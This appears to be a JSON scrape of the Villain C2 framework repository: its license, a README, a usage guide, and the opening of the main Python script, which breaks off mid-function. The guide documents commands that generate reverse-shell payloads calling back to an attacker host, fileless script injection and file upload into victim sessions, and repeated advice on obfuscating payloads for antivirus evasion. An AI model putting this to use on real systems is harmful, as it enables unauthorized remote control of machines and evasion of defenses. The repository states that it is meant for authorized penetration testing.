{
  "metadata": {
    "timestamp": 1736559783578,
    "page": 504,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjUxMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "t3l3machus/Villain",
      "stars": 3874,
      "defaultBranch": "main",
      "files": [
        {
          "name": "Core",
          "type": "tree",
          "content": null
        },
        {
          "name": "LICENSE.md",
          "type": "blob",
          "size": 18.3212890625,
          "content": "This document (LICENSE.md) outlines the terms and conditions governing the distribution of Villain. A copy\nof the Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International Public License is appended to this file.\n\nCopyright (c) 2022-2024 Panagiotis Chartas (t3l3machus)\n\nContributors are encouraged to submit Git pull requests to fix bugs and add new features. \nBy submitting changes to the Villain C2 Framework repository, you grant Panagiotis Chartas (aka t3l3machus), \nthe Creator and Maintainer of the \"Villain C2 Framework,\" an unlimited, non-exclusive right to reuse, modify, \nand relicense your code. Villain will remain Open Source, but the ability to relicense contributions is \ncrucial to prevent potential issues that have affected other Free Software projects. \nIf you have special licensing conditions for your contributions, please specify them when submitting.\n\nFor any questions or if you wish to use Villain or parts of Villain in a commercial manner, you can\ncontact the Creator at t3l3machus@protonmail.com.\n\nThis program is distributed in the hope that it will be useful, but\nWITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n\n\n# Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International\n\nCreative Commons Corporation (“Creative Commons”) is not a law firm and does not provide legal services or legal advice. Distribution of Creative Commons public licenses does not create a lawyer-client or other relationship. Creative Commons makes its licenses and related information available on an “as-is” basis. Creative Commons gives no warranties regarding its licenses, any material licensed under their terms and conditions, or any related information. Creative Commons disclaims all liability for damages resulting from their use to the fullest extent possible.\n\n**Using Creative Commons Public Licenses**\n\nCreative Commons public licenses provide a standard set of terms and conditions that creators and other rights holders may use to share original works of authorship and other material subject to copyright and certain other rights specified in the public license below. The following considerations are for informational purposes only, are not exhaustive, and do not form part of our licenses.\n\n* __Considerations for licensors:__ Our public licenses are intended for use by those authorized to give the public permission to use material in ways otherwise restricted by copyright and certain other rights. Our licenses are irrevocable. Licensors should read and understand the terms and conditions of the license they choose before applying it. Licensors should also secure all rights necessary before applying our licenses so that the public can reuse the material as expected. Licensors should clearly mark any material not subject to the license. This includes other CC-licensed material, or material used under an exception or limitation to copyright. [More considerations for licensors](http://wiki.creativecommons.org/Considerations_for_licensors_and_licensees#Considerations_for_licensors).\n\n* __Considerations for the public:__ By using one of our public licenses, a licensor grants the public permission to use the licensed material under specified terms and conditions. If the licensor’s permission is not necessary for any reason–for example, because of any applicable exception or limitation to copyright–then that use is not regulated by the license. Our licenses grant only permissions under copyright and certain other rights that a licensor has authority to grant. Use of the licensed material may still be restricted for other reasons, including because others have copyright or other rights in the material. A licensor may make special requests, such as asking that all changes be marked or described. Although not required by our licenses, you are encouraged to respect those requests where reasonable. [More considerations for the public](http://wiki.creativecommons.org/Considerations_for_licensors_and_licensees#Considerations_for_licensees).\n\n## Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International Public License\n\nBy exercising the Licensed Rights (defined below), You accept and agree to be bound by the terms and conditions of this Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International Public License (\"Public License\"). To the extent this Public License may be interpreted as a contract, You are granted the Licensed Rights in consideration of Your acceptance of these terms and conditions, and the Licensor grants You such rights in consideration of benefits the Licensor receives from making the Licensed Material available under these terms and conditions.\n\n### Section 1 – Definitions.\n\na. __Adapted Material__ means material subject to Copyright and Similar Rights that is derived from or based upon the Licensed Material and in which the Licensed Material is translated, altered, arranged, transformed, or otherwise modified in a manner requiring permission under the Copyright and Similar Rights held by the Licensor. For purposes of this Public License, where the Licensed Material is a musical work, performance, or sound recording, Adapted Material is always produced where the Licensed Material is synched in timed relation with a moving image.\n\nb. __Copyright and Similar Rights__ means copyright and/or similar rights closely related to copyright including, without limitation, performance, broadcast, sound recording, and Sui Generis Database Rights, without regard to how the rights are labeled or categorized. For purposes of this Public License, the rights specified in Section 2(b)(1)-(2) are not Copyright and Similar Rights.\n\ne. __Effective Technological Measures__ means those measures that, in the absence of proper authority, may not be circumvented under laws fulfilling obligations under Article 11 of the WIPO Copyright Treaty adopted on December 20, 1996, and/or similar international agreements.\n\nf. __Exceptions and Limitations__ means fair use, fair dealing, and/or any other exception or limitation to Copyright and Similar Rights that applies to Your use of the Licensed Material.\n\nh. __Licensed Material__ means the artistic or literary work, database, or other material to which the Licensor applied this Public License.\n\ni. __Licensed Rights__ means the rights granted to You subject to the terms and conditions of this Public License, which are limited to all Copyright and Similar Rights that apply to Your use of the Licensed Material and that the Licensor has authority to license.\n\nh. __Licensor__ means the individual(s) or entity(ies) granting rights under this Public License.\n\ni. __NonCommercial__ means not primarily intended for or directed towards commercial advantage or monetary compensation. For purposes of this Public License, the exchange of the Licensed Material for other material subject to Copyright and Similar Rights by digital file-sharing or similar means is NonCommercial provided there is no payment of monetary compensation in connection with the exchange.\n\nj. __Share__ means to provide material to the public by any means or process that requires permission under the Licensed Rights, such as reproduction, public display, public performance, distribution, dissemination, communication, or importation, and to make material available to the public including in ways that members of the public may access the material from a place and at a time individually chosen by them.\n\nk. __Sui Generis Database Rights__ means rights other than copyright resulting from Directive 96/9/EC of the European Parliament and of the Council of 11 March 1996 on the legal protection of databases, as amended and/or succeeded, as well as other essentially equivalent rights anywhere in the world.\n\nl. __You__ means the individual or entity exercising the Licensed Rights under this Public License. __Your__ has a corresponding meaning.\n\n### Section 2 – Scope.\n\na. ___License grant.___\n\n   1. Subject to the terms and conditions of this Public License, the Licensor hereby grants You a worldwide, royalty-free, non-sublicensable, non-exclusive, irrevocable license to exercise the Licensed Rights in the Licensed Material to:\n\n        A. reproduce and Share the Licensed Material, in whole or in part, for NonCommercial purposes only; and\n\n        B. produce and reproduce, but not Share, Adapted Material for NonCommercial purposes only.\n\n   2. __Exceptions and Limitations.__ For the avoidance of doubt, where Exceptions and Limitations apply to Your use, this Public License does not apply, and You do not need to comply with its terms and conditions.\n\n   3. __Term.__ The term of this Public License is specified in Section 6(a).\n\n   4. __Media and formats; technical modifications allowed.__ The Licensor authorizes You to exercise the Licensed Rights in all media and formats whether now known or hereafter created, and to make technical modifications necessary to do so. The Licensor waives and/or agrees not to assert any right or authority to forbid You from making technical modifications necessary to exercise the Licensed Rights, including technical modifications necessary to circumvent Effective Technological Measures. For purposes of this Public License, simply making modifications authorized by this Section 2(a)(4) never produces Adapted Material.\n\n   5. __Downstream recipients.__\n\n        A. __Offer from the Licensor – Licensed Material.__ Every recipient of the Licensed Material automatically receives an offer from the Licensor to exercise the Licensed Rights under the terms and conditions of this Public License.\n\n        B. __No downstream restrictions.__ You may not offer or impose any additional or different terms or conditions on, or apply any Effective Technological Measures to, the Licensed Material if doing so restricts exercise of the Licensed Rights by any recipient of the Licensed Material.\n\n   6. __No endorsement.__ Nothing in this Public License constitutes or may be construed as permission to assert or imply that You are, or that Your use of the Licensed Material is, connected with, or sponsored, endorsed, or granted official status by, the Licensor or others designated to receive attribution as provided in Section 3(a)(1)(A)(i).\n\nb. ___Other rights.___\n\n   1. Moral rights, such as the right of integrity, are not licensed under this Public License, nor are publicity, privacy, and/or other similar personality rights; however, to the extent possible, the Licensor waives and/or agrees not to assert any such rights held by the Licensor to the limited extent necessary to allow You to exercise the Licensed Rights, but not otherwise.\n\n   2. Patent and trademark rights are not licensed under this Public License.\n\n   3. To the extent possible, the Licensor waives any right to collect royalties from You for the exercise of the Licensed Rights, whether directly or through a collecting society under any voluntary or waivable statutory or compulsory licensing scheme. In all other cases the Licensor expressly reserves any right to collect such royalties, including when the Licensed Material is used other than for NonCommercial purposes.\n\n### Section 3 – License Conditions.\n\nYour exercise of the Licensed Rights is expressly made subject to the following conditions.\n\na. ___Attribution.___\n\n   1. If You Share the Licensed Material, You must:\n\n      A. retain the following if it is supplied by the Licensor with the Licensed Material:\n\n         i. identification of the creator(s) of the Licensed Material and any others designated to receive attribution, in any reasonable manner requested by the Licensor (including by pseudonym if designated);\n\n         ii. a copyright notice;\n\n         iii. a notice that refers to this Public License;\n\n         iv. a notice that refers to the disclaimer of warranties;\n\n         v. a URI or hyperlink to the Licensed Material to the extent reasonably practicable;\n\n      B. indicate if You modified the Licensed Material and retain an indication of any previous modifications; and\n\n      C. indicate the Licensed Material is licensed under this Public License, and include the text of, or the URI or hyperlink to, this Public License.\n \n        For the avoidance of doubt, You do not have permission under this Public License to Share Adapted Material.\n\n   2. You may satisfy the conditions in Section 3(a)(1) in any reasonable manner based on the medium, means, and context in which You Share the Licensed Material. For example, it may be reasonable to satisfy the conditions by providing a URI or hyperlink to a resource that includes the required information.\n\n   3. If requested by the Licensor, You must remove any of the information required by Section 3(a)(1)(A) to the extent reasonably practicable.\n\n### Section 4 – Sui Generis Database Rights.\n\nWhere the Licensed Rights include Sui Generis Database Rights that apply to Your use of the Licensed Material:\n\na. for the avoidance of doubt, Section 2(a)(1) grants You the right to extract, reuse, reproduce, and Share all or a substantial portion of the contents of the database for NonCommercial purposes only and provided You do not Share Adapted Material;\n\nb. if You include all or a substantial portion of the database contents in a database in which You have Sui Generis Database Rights, then the database in which You have Sui Generis Database Rights (but not its individual contents) is Adapted Material; and\n\nc. You must comply with the conditions in Section 3(a) if You Share all or a substantial portion of the contents of the database.\n\nFor the avoidance of doubt, this Section 4 supplements and does not replace Your obligations under this Public License where the Licensed Rights include other Copyright and Similar Rights.\n\n### Section 5 – Disclaimer of Warranties and Limitation of Liability.\n\na. __Unless otherwise separately undertaken by the Licensor, to the extent possible, the Licensor offers the Licensed Material as-is and as-available, and makes no representations or warranties of any kind concerning the Licensed Material, whether express, implied, statutory, or other. This includes, without limitation, warranties of title, merchantability, fitness for a particular purpose, non-infringement, absence of latent or other defects, accuracy, or the presence or absence of errors, whether or not known or discoverable. Where disclaimers of warranties are not allowed in full or in part, this disclaimer may not apply to You.__\n\nb. __To the extent possible, in no event will the Licensor be liable to You on any legal theory (including, without limitation, negligence) or otherwise for any direct, special, indirect, incidental, consequential, punitive, exemplary, or other losses, costs, expenses, or damages arising out of this Public License or use of the Licensed Material, even if the Licensor has been advised of the possibility of such losses, costs, expenses, or damages. Where a limitation of liability is not allowed in full or in part, this limitation may not apply to You.__\n\nc. The disclaimer of warranties and limitation of liability provided above shall be interpreted in a manner that, to the extent possible, most closely approximates an absolute disclaimer and waiver of all liability.\n\n### Section 6 – Term and Termination.\n\na. This Public License applies for the term of the Copyright and Similar Rights licensed here. However, if You fail to comply with this Public License, then Your rights under this Public License terminate automatically.\n\nb. Where Your right to use the Licensed Material has terminated under Section 6(a), it reinstates:\n\n   1. automatically as of the date the violation is cured, provided it is cured within 30 days of Your discovery of the violation; or\n\n   2. upon express reinstatement by the Licensor.\n\n   For the avoidance of doubt, this Section 6(b) does not affect any right the Licensor may have to seek remedies for Your violations of this Public License.\n\nc. For the avoidance of doubt, the Licensor may also offer the Licensed Material under separate terms or conditions or stop distributing the Licensed Material at any time; however, doing so will not terminate this Public License.\n\nd. Sections 1, 5, 6, 7, and 8 survive termination of this Public License.\n\n### Section 7 – Other Terms and Conditions.\n\na. The Licensor shall not be bound by any additional or different terms or conditions communicated by You unless expressly agreed.\n\nb. Any arrangements, understandings, or agreements regarding the Licensed Material not stated herein are separate from and independent of the terms and conditions of this Public License.\n\n### Section 8 – Interpretation.\n\na. For the avoidance of doubt, this Public License does not, and shall not be interpreted to, reduce, limit, restrict, or impose conditions on any use of the Licensed Material that could lawfully be made without permission under this Public License.\n\nb. To the extent possible, if any provision of this Public License is deemed unenforceable, it shall be automatically reformed to the minimum extent necessary to make it enforceable. If the provision cannot be reformed, it shall be severed from this Public License without affecting the enforceability of the remaining terms and conditions.\n\nc. No term or condition of this Public License will be waived and no failure to comply consented to unless expressly agreed to by the Licensor.\n\nd. Nothing in this Public License constitutes or may be interpreted as a limitation upon, or waiver of, any privileges and immunities that apply to the Licensor or You, including from the legal processes of any jurisdiction or authority.\n\n> Creative Commons is not a party to its public licenses. Notwithstanding, Creative Commons may elect to apply one of its public licenses to material it publishes and in those instances will be considered the “Licensor.” Except for the limited purpose of indicating that material is shared under a Creative Commons public license or as otherwise permitted by the Creative Commons policies published at [creativecommons.org/policies](http://creativecommons.org/policies), Creative Commons does not authorize the use of the trademark “Creative Commons” or any other trademark or logo of Creative Commons without its prior written consent including, without limitation, in connection with any unauthorized modifications to any of its public licenses or any other arrangements, understandings, or agreements concerning use of licensed material. For the avoidance of doubt, this paragraph does not form part of the public licenses.\n>\n> Creative Commons may be contacted at [creativecommons.org](http://creativecommons.org).\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 3.767578125,
          "content": "# Villain\n[![Python](https://img.shields.io/badge/Python-%E2%89%A5%203.6-yellow.svg)](https://www.python.org/) \n<img src=\"https://img.shields.io/badge/PowerShell-%E2%89%A5%20v3.0-blue\">\n<img src=\"https://img.shields.io/badge/Developed%20on-kali%20linux-blueviolet\">\n[![License](https://img.shields.io/badge/License-CC%20Attr--NonCommercial%204.0-red)](https://github.com/t3l3machus/Villain/blob/main/LICENSE.md)\n<img src=\"https://img.shields.io/badge/Maintained%3F-Yes-96c40f\">\n\n## Purpose\nVillain is a high-level Stage 0/1 C2 framework that can handle multiple reverse TCP and HoaxShell-based shells, enhance their functionality with additional features (commands, utilities), and share them among connected sibling servers (Villain instances running on different machines).  \n\nThe framework's main features include:\n - Payload generation based on default, customizable and/or user defined payload templates (Windows & Linux),\n - A dynamically engaged pseudo-shell prompt that can quickly swift between shell sessions,\n - File uploads (via http),\n - Fileless execution of scripts against active sessions,\n - Auto-invoke ConPtyShell against a powershell r-shell session as a new process to gain a fully interactive Windows shell,\n - Multiplayer mode,\n - Session Defender (a feature that inspects user issued commands for mistakes / unintentional input that may cause a shell to hang).\n   \n\n### Video Presentations\nThere’s no up-to-date presentation of Villain with its latest features, but these videos give a good overview of its functionality.  \n[2022-11-30] [John Hammond](https://github.com/JohnHammond) showcased the tool in this incredible video -> [youtube.com/watch?v=pTUggbSCqA0](https://www.youtube.com/watch?v=pTUggbSCqA0)  \n[2023-03-30] Version 2.0.0 release demo, made by me -> [youtube.com/watch?v=NqZEmBsLCvQ](https://www.youtube.com/watch?v=HR1KM8wrSV8)  \n\n\n| :exclamation:  **Disclaimer**  |\n|---------------------------------|\n| **This project is in active development**. Expect breaking changes with releases. |\n| Using this tool against hosts that you do not have explicit permission to test is illegal. You are responsible for any trouble you may cause by using this tool. |\n\n## Preview\n\n\nhttps://github.com/t3l3machus/Villain/assets/75489922/20bf0ad5-d06f-4658-bb43-1bb0359fe3f7\n\n\n\n\n![image](https://user-images.githubusercontent.com/75489922/228979419-340918d4-3c04-48b6-913a-91aaf8756ff6.png)  \n\n## Installation \n\nVillain has been explicitly developed and tested on **kali linux**. You can install it with `apt`:\n```\napt install villain\n```\n\n❗New releases may take time to be incorporated into kali's repositories. \n\nFor the latest version or if you prefer to install it manually:\n```\ngit clone https://github.com/t3l3machus/Villain\ncd ./Villain\npip3 install -r requirements.txt\n```\n\nYou must also install `gnome-terminal` (required for one of the framework's commands):\n```\nsudo apt update&&sudo apt install gnome-terminal\n```\n\n## Usage\nYou should run as root:\n```\nvillain [-h] [-p PORT] [-x HOAX_PORT] [-n NETCAT_PORT] [-f FILE_SMUGGLER_PORT] [-i] [-c CERTFILE] [-k KEYFILE] [-u] [-q] \n```\n\nCheck out the [Usage Guide](https://github.com/t3l3machus/Villain/blob/main/Usage_Guide.md) for more.  \n\n:warning: Create your own obfuscated reverse shell templates and replace the default ones in your instance of Villain to better handle AV evasion. Here's how 📽️ -> [youtube.com/watch?v=grSBdZdUya0](https://www.youtube.com/watch?v=grSBdZdUya0)\n\n## Contributions\nPull requests are generally welcome. Please, keep in mind: I am constantly working on new tools as well as maintaining several existing ones. I may be slow to respond.\nIf you have an idea for a new feature that comes with a significant chunk of code, I suggest you first contact me to discuss if there's something similar already in the making, before making a PR. \n"
        },
        {
          "name": "Usage_Guide.md",
          "type": "blob",
          "size": 6.11328125,
          "content": "# Usage Guide\n:warning: Villain was explicitly developed and tested on **kali linux**.  \n:warning: This guide is a work in progress currently describing key features. Check out Villain's introduction on youtube for more info.\n\nThere’s no up-to-date presentation of Villain with its latest features, but these videos give a good overview of its functionality:\n- [2022-11-30] [John Hammond](https://github.com/JohnHammond) showcased the tool in this incredible video -> [youtube.com/watch?v=pTUggbSCqA0](https://www.youtube.com/watch?v=pTUggbSCqA0)  \n- [2023-03-30] Latest release demo, made by me -> [youtube.com/watch?v=NqZEmBsLCvQ](https://www.youtube.com/watch?v=HR1KM8wrSV8)  \n\n**Disclaimer**: Using this tool against hosts that you do not have explicit permission to test is illegal. You are responsible for any trouble you may cause by using this tool.\n\n## Table of contents\n1. [News](#News)\n2. [Generate Reverse Shell Commands](#Generate-Reverse-Shell-Commands)\n3. [Connect With Sibling Server](#Connect-With-Sibling-Server)\n4. [Shell](#shell)\n5. [Upload Command](#upload)\n6. [Conptyshell](#Conptyshell)\n7. [Exec](#Exec)\n8. [Flee](#Flee)\n9. [Purge](#Purge)\n10. [Chat with Sibling Servers](#Chat-with-Sibling-Servers)\n11. [Session Defender](#Session-Defender)\n\n\n## Generate Reverse Shell Commands\nUse the `generate` prompt command to generate payloads for Windows / Linux machines. \nIn the latest Villain release, this function was redesigned to use payload templates (files). In `Core/payload_templates/<OS>/<HANDLER>/` you can find these templates, edit them, make your own, etc. Ultimately, you should replace the predefined Windows reverse shell commands with obfuscated versions. That way you can create a personalized instance of Villain and deal with AV evasion in a more productive and efficient way. Here's how 📽️ -> [youtube.com/watch?v=grSBdZdUya0](https://www.youtube.com/watch?v=grSBdZdUya0)  \n\nMain logic:\n```\ngenerate payload=<OS_TYPE/HANDLER/PAYLOAD_TEMPLATE> lhost=<IP or INTERFACE> [ obfuscate encode ]\n```\n\nHandlers:\n- reverse_tcp\n- hoaxshell\n\nThe \"payload\" argument supports tab-autocomplete, allowing for quick selection of valid OS types, handlers, and templates.\n\nUsage examples:\n```\ngenerate payload=windows/reverse_tcp/powershell lhost=eth0 encode\ngenerate payload=linux/hoaxshell/sh_curl lhost=eth0 obfuscate\n```\n\n- The ENCODE and OBFUSCATE keywords are enabled for certain templates and can be used during payload generation. \n- For info on a particular template, use \"generate\" with PAYLOAD being the only provided argument.\n- To catch HoaxShell https-based reverse shells you need to start Villain with SSL.\n- Ultimately, one should edit the templates and add obfuscated versions of the commands for AV \n  evasion.\n\n⚡Reverse TCP based shells are more stable and reliable than HoaxShell.\n⚠️HoaxShell payloads are not reusable (will work only once). I will probably change that in the future.\n\nUse the prompt commands `backdoors` and `sessions` to list info about your active shell sessions.\n\n## Connect With Sibling Server\nUse the `connect` prompt command to connect and share your shell sessions with another machine running Villain. \n```\nconnect <IP> <TEAM SERVER PORT>\n```\nBy default, the Core server port is `65001` (you can change that with `-p` when starting Villain).\n\n## The shell Command\nUse the `shell` prompt command to start an interactive pseudo-shell for a shell session. The effectiveness of the pseudo shell is going to vary depending on the quality and stability of the shell session. Again, you should prefer TCP socket based shells as they will always be more stable than HoaxShell.\n```\nshell <SESSION ID or ALIAS>\n```\nPress Ctrl + C or type `exit` to return to the main Villain prompt.\n\n## Upload\nUse the `upload` pseudo shell prompt command to transfer a file from your system into an active session. The file will be http requested automatically from the Http File Smuggler (running by default on port 8888). The feature works regardless if the session is owned by you or a sibling server.\n\nFrom an active pseudo shell prompt:\n```\nupload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH>\n```\n\n## Conptyshell\nUse the `conptyshell` prompt command to automatically slap `Invoke-ConPtyShell.ps1` against a shell session. A new terminal window with netcat listening will pop up (you need to have gnome-terminal installed) and the script will be executed on the target as a new process, meaning you get a fully interactive shell AND you get to keep your backdoor. Currently works only for powershell.exe backdoors.\nBecause I love Invoke-ConPtyShell.\n\nUsage: \n```\nconptyshell <IP or INTERFACE> <PORT> <SESSION ID or ALIAS>\n```\n\n## Inject\nUse the `inject` pseudo shell prompt command to fileless exec a local script file over http against an active session. Files are executed by being http requested from the Http File Smuggler. The script you execute should much the shell session type (e.g., a PowerShell script script should be executed against a powershell.exe session, etc).  \n\nUsage: \n```\ninject </path/to/local/file> \n```\n\n## Flee\nUse the `flee` prompt command to exit Villain without terminating any active sessions. If you start Villain again later and there are still victim machines sending HoaxShell beacons, the sessions will be re-established automatically.  \n\n## Purge\nVillain automatically stores information regarding generated implants and loads them in memory every time it starts. This way, HoaxShell generated implants become reusable and it is possible to re-establish older sessions, assuming the payload is still running on the victim(s). Use the `purge` prompt command to delete all session related metadata. It does not affect any active sessions you may have.\n\n## Chat with Sibling Servers\nCommands starting with \"#\" are interpreted as messages and will be broadcasted to all connected Sibling Servers.\n\n## Session Defender\nVillain has a function that inspects user issued shell commands for input that may cause a backdoor shell session to hang (e.g., unclosed single/double quotes or backticks, commands that may start a new interactive session within the current shell and more). Use the `cmdinspector` command to turn that feature on/off.  \n\nUsage: \n```\ncmdinspector <ON/OFF>\n```\n\n"
        },
        {
          "name": "Villain.py",
          "type": "blob",
          "size": 38.080078125,
          "content": "#!/usr/bin/env python3\n#\n# Author: Panagiotis Chartas (t3l3machus) \n#\n# This script is part of the \"Villain C2 Framework\": \n# https://github.com/t3l3machus/Villain\n\n\nimport argparse\nfrom subprocess import check_output\nfrom Core.common import *\nfrom Core.settings import Villain, Hoaxshell_Settings, Core_Server_Settings, TCP_Sock_Handler_Settings, File_Smuggler_Settings, Loading\nfrom Core.logging import clear_metadata\nfrom hashlib import md5\nfrom requests import get as requests_get\nfrom requests.exceptions import ReadTimeout\n\n# -------------- Arguments -------------- #\nparser = argparse.ArgumentParser()\n\nparser.add_argument(\"-p\", \"--port\", action=\"store\", help = \"Team server port (default: 6501).\", type = int)\nparser.add_argument(\"-x\", \"--hoax-port\", action=\"store\", help = \"HoaxShell server port (default: 8080 via http, 443 via https).\", type = int)\nparser.add_argument(\"-n\", \"--reverse-tcp-port\", action=\"store\", help = \"Reverse TCP multi-handler port (default: 4443).\", type = int)\nparser.add_argument(\"-f\", \"--file-smuggler-port\", action=\"store\", help = \"Http file smuggler server port (default: 8888).\", type = int)\nparser.add_argument(\"-i\", \"--insecure\", action=\"store_true\", help = \"Allows any Villain client (sibling server) to connect to your instance without prompting you for verification.\")\nparser.add_argument(\"-c\", \"--certfile\", action=\"store\", help = \"Path to your ssl certificate (for HoaxShell https server).\")\nparser.add_argument(\"-k\", \"--keyfile\", action=\"store\", help = \"Path to the private key for your certificate (for HoaxShell https server).\")\nparser.add_argument(\"-u\", \"--update\", action=\"store_true\", help = \"Try to fetch the latest commits from the main branch on GitHub.\")\nparser.add_argument(\"-v\", \"--version\", action=\"store_true\", help = \"Show program's version number and exit.\")\nparser.add_argument(\"-q\", \"--quiet\", action=\"store_true\", help = \"Do not print the banner on startup.\")\n\nargs = parser.parse_args()\n\nif args.version:\n\tprint(f'v{Villain.version}')\n\texit(0)\n\n# Parse the bind ports of servers & listeners\nHoaxshell_Settings.certfile = args.certfile\nHoaxshell_Settings.keyfile = args.keyfile\nHoaxshell_Settings.ssl_support = True if (args.certfile and args.keyfile) else False\nHoaxshell_Settings.bind_port = args.hoax_port if args.hoax_port else Hoaxshell_Settings.bind_port\n\nif Hoaxshell_Settings.ssl_support:\n\tHoaxshell_Settings.bind_port_ssl = args.hoax_port if args.hoax_port else Hoaxshell_Settings.bind_port_ssl\n\nCore_Server_Settings.bind_port = args.port if args.port else Core_Server_Settings.bind_port\nTCP_Sock_Handler_Settings.bind_port = args.reverse_tcp_port if args.reverse_tcp_port else TCP_Sock_Handler_Settings.bind_port\nFile_Smuggler_Settings.bind_port = args.file_smuggler_port if args.file_smuggler_port else File_Smuggler_Settings.bind_port\n\n# Check if there are port number conflicts\ndefined_ports = [Core_Server_Settings.bind_port, TCP_Sock_Handler_Settings.bind_port, File_Smuggler_Settings.bind_port]\n\nif Hoaxshell_Settings.ssl_support:\n\tdefined_ports.append(Hoaxshell_Settings.bind_port_ssl)\nelse:\n\tdefined_ports.append(Hoaxshell_Settings.bind_port)\n\nif check_list_for_duplicates(defined_ports):\n\texit(f'[{DEBUG}] The port number of each server/handler must be different.')\n\n# Define core server security level\nCore_Server_Settings.insecure = True if args.insecure else False\n\n# Import Core\t\nfrom Core.villain_core import *\n\n\n# -------------- Functions & Classes -------------- #\n\ndef haxor_print(text, leading_spaces = 0):\n\n\ttext_chars = list(text)\n\tcurrent, mutated = '', ''\n\n\tfor i in range(len(text)):\n\t\t\n\t\toriginal = text_chars[i]\n\t\tcurrent += original\n\t\tmutated += f'\\033[1;38;5;82m{text_chars[i].upper()}\\033[0m'\n\t\tprint(f'\\r{\" \" * leading_spaces}{mutated}', end = '')\n\t\tsleep(0.05)\n\t\tprint(f'\\r{\" \" * leading_spaces}{current}', end = '')\n\t\tmutated = current\n\n\tprint(f'\\r{\" \" * leading_spaces}{text}\\n')\n\n\n\ndef print_banner():\n\t\n\tprint('\\r')\n\tpadding = '  '\n\t\n\tV = [[' ', '┬', ' ', ' ', '┬'], [' ', '└','┐','┌', '┘'], [' ', ' ','└','┘', ' ']]\n\tI =\t[[' ', '┬'], [' ', '│',], [' ', '┴']]\n\tL = [[' ', '┬',' ',' '], [' ', '│',' ', ' '], [' ', '┴','─','┘']]\t\n\tL2 = [['┬',' ',' '], ['│',' ', ' '], ['┴','─','┘']]\t\n\tA = [['┌','─','┐'], ['├','─','┤'], ['┴',' ','┴']]\n\tI =\t[[' ', '┬'], [' ', '│',], [' ', '┴']]\n\tN = [[' ', '┌','┐','┌'], [' ', '│','│','│'], [' ', '┘','└','┘']]\t\n\n\tbanner = [V,I,L,L2,A,I,N]\n\tfinal = []\t\n\tinit_color = 97\n\ttxt_color = init_color\n\tcl = 0\n\t\t\n\tfor charset in range(0, 3):\n\t\tfor pos in range(0, len(banner)):\n\t\t\tfor i in range(0, len(banner[pos][charset])):\n\t\t\t\tclr = f'\\033[38;5;{txt_color}m'\n\t\t\t\tchar = f'{clr}{banner[pos][charset][i]}'\n\t\t\t\tfinal.append(char)\n\t\t\t\tcl += 1\n\t\t\t\ttxt_color = txt_color + 36 if cl <= 3 else txt_color\n\n\t\t\tcl = 0\n\n\t\t\ttxt_color = init_color\n\t\tinit_color += 1\n\n\t\tif charset < 2: final.append('\\n   ')\n\t\n\tprint(f\"   {''.join(final)}{END}\")\n\thaxor_print('Unleashed', 17)\n\tprint_meta()\n\n\n\ndef print_meta():\n\tprint(f'{META} Created by t3l3machus')\n\tprint(f'{META} Follow on GitHub, X, YT: @t3l3machus')\n\tprint(f'{META} Thank you!\\n')\n\n\t\n\ndef alias_sanitizer(word, _min = 2, _max = 26):\n\t\n\tlength = len(word)\n\t\n\tif length >= _min and length <= _max:\n\t\n\t\tvalid = ascii_uppercase + ascii_lowercase + '-_' + digits\n\t\t\n\t\tfor char in word:\t\t\n\t\t\tif char not in valid:\n\t\t\t\treturn [f'Alias includes illegal character: \"{char}\".']\n\t\t\n\t\treturn word\n\t\t\t\t\n\telse:\n\t\treturn ['Alias length must be between 2 to 26 characters.']\n\n\n\t\n# Tab Auto-Completer          \nclass Completer(object):\n\t\n\tdef __init__(self):\n\t\t\n\t\tself.tab_counter = 0\t\t\n\t\tself.main_prompt_commands = clone_dict_keys(PrompHelp.commands)\n\t\tself.main_command_arguments = ['payload', 'lhost', 'obfuscate', 'encode', 'constraint_mode', \\\n\t\t'exec_outfile', 'domain']\n\t\tself.pseudo_shell_commands = ['upload', 'cmdinspector', 'inject']\n\t\tself.payload_templates_root = os.path.dirname(os.path.abspath(__file__)) + f'{os.sep}Core{os.sep}payload_templates'\n\t\n\t\n\t\n\tdef reset_counter(self):\t\n\t\tsleep(0.4)\n\t\tself.tab_counter = 0\n\t\t\n\t\n\t\n\tdef get_possible_cmds(self, cmd_frag):\n\t\t\n\t\tmatches = []\n\t\t\n\t\tfor cmd in self.main_prompt_commands:\n\t\t\tif re.match(f\"^{cmd_frag}\", cmd):\n\t\t\t\tmatches.append(cmd)\n\t\t\n\t\treturn matches\n\t\t\n\t\t\n\t\t\n\tdef get_match_from_list(self, cmd_frag, wordlist):\n\t\t\n\t\tmatches = []\n\t\t\n\t\tfor w in wordlist:\n\t\t\tif re.match(f\"^{cmd_frag}\", w):\n\t\t\t\tmatches.append(w)\n\t\t\n\t\tif len(matches) == 1:\n\t\t\treturn matches[0]\n\t\t\n\t\telif len(matches) > 1:\n\t\t\t\n\t\t\tchar_count = 0\n\t\t\t\n\t\t\twhile True:\n\t\t\t\tchar_count += 1\n\t\t\t\tnew_search_term_len = (len(cmd_frag) + char_count)\n\t\t\t\tnew_word_frag = matches[0][0:new_search_term_len]\n\t\t\t\tunique = []\n\t\t\t\t\n\t\t\t\tfor m in matches:\n\t\t\t\t\t\n\t\t\t\t\tif re.match(f\"^{new_word_frag}\", m):\n\t\t\t\t\t\tunique.append(m)\t\t\n\t\t\t\t\n\t\t\t\tif len(unique) < len(matches):\n\t\t\t\t\t\n\t\t\t\t\tif self.tab_counter <= 1:\n\t\t\t\t\t\treturn new_word_frag[0:-1]\n\t\t\t\t\t\t\n\t\t\t\t\telse:\t\t\t\t\t\t\n\t\t\t\t\t\tprint('\\n')\n\t\t\t\t\t\tprint_columns(matches)\n\t\t\t\t\t\tMain_prompt.rst_prompt() if Main_prompt.ready else sys.stdout.write('\\r' + Main_prompt.hoax_prompt + global_readline.get_line_buffer())\n\t\t\t\t\t\treturn False \n\t\t\t\t\n\t\t\t\telif len(unique) == 1:\n\t\t\t\t\treturn False\n\t\t\t\t\n\t\t\t\telse:\n\t\t\t\t\tcontinue\n\t\t\t\t\t\n\t\telse:\n\t\t\treturn 